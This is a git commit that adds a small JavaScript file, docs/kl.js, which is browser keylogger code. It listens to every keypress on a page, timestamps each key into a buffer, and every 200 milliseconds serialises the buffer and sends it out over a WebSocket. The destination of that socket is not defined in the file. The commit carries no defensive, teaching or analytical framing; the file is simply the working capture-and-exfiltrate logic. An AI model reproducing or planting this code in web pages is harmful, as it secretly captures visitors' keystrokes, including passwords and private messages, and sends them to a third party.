85804ed6d6f10e68dac96876e1d37c9aedb5c6b0
AustinJackS <austinjack404@gmail.com>
2017-06-09 13:19:54 -0400

    Create kl.js

---
+++ docs/kl.js
@@ -0,0 +1,17 @@
+var buffer=[];
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp
+    };
+    buffer.push(stroke);
+}
+
+window.setInterval(function() {
+    if (buffer.length > 0) {
+        var data = encodeURIComponent(JSON.stringify(buffer));
+        ws.send(data);
+        buffer = [];
+    }
+}, 200);
